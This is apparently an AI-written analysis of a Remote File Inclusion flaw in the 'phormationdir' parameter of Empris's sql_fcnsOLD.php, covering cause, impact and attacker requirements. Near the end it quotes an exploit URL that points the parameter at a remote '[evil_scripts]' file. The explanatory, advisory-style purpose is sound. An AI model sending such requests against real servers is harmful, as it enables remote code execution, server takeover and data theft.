Based on the provided content, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) vulnerability present in the 'phormationdir' parameter of the `sql_fcnsOLD.php` script within the Empris application. This occurs because the application improperly handles user-supplied input for the `phormationdir` parameter, allowing an attacker to include a remote file by specifying a URL.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary weakness is the application's failure to sanitize user input in the `phormationdir` parameter, leading to the ability to include remote files.
- **Lack of Input Validation:** The application doesn't validate or sanitize the `phormationdir` parameter allowing arbitrary URLs to be used as the value.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious remote file, the attacker can execute arbitrary code on the server. This can lead to:
    - Full server compromise
    - Data theft
    - Malware installation
    - Website defacement
- **Data Modification:** An attacker can potentially modify data within the application's database.
- **Denial of Service:** Depending on the included file, a denial of service condition may be triggered on the server.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability is triggered through a crafted HTTP GET request. The attacker needs to append a vulnerable parameter `phormationdir` with the URI of the malicious script.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to reach the vulnerable application.
- **No Authentication Required:** The exploit doesn't seem to require prior authentication, meaning any attacker with network access can try to exploit this vulnerability.
- **Knowledge of Vulnerable Parameter:** The attacker needs to know the vulnerable parameter name (`phormationdir`) and the vulnerable script path (`sql_fcnsOLD.php`).

**Technical Details:**
The provided exploit example is:
`http://www.site.com/[Empris_path]/phormation/sql_fcnsOLD.php?phormationdir=[evil_scripts]`
This shows how the `phormationdir` parameter can be manipulated to point to an external malicious script (`[evil_scripts]`).
